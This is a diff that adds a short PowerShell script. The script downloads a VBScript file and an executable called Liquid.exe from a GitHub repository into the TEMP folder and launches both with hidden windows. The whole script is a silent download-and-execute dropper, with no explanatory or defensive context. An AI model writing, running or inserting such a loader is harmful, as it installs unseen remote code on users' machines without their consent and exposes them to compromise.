@@ -1,0 +1,8 @@
+$vbs = "$env:TEMP\script.vbs"
+$exe = "$env:TEMP\Liquid.exe"
+
+Invoke-WebRequest -Uri 'https://github.com/jesuss13377-source/123/raw/refs/heads/main/script.vbs' -OutFile $vbs -UseBasicParsing
+Invoke-WebRequest -Uri 'https://github.com/jesuss13377-source/123/raw/refs/heads/main/Liquid.exe' -OutFile $exe -UseBasicParsing
+
+Start-Process -FilePath 'wscript.exe' -ArgumentList "`"$vbs`"" -WindowStyle Hidden
+Start-Process -FilePath $exe -WindowStyle Hidden
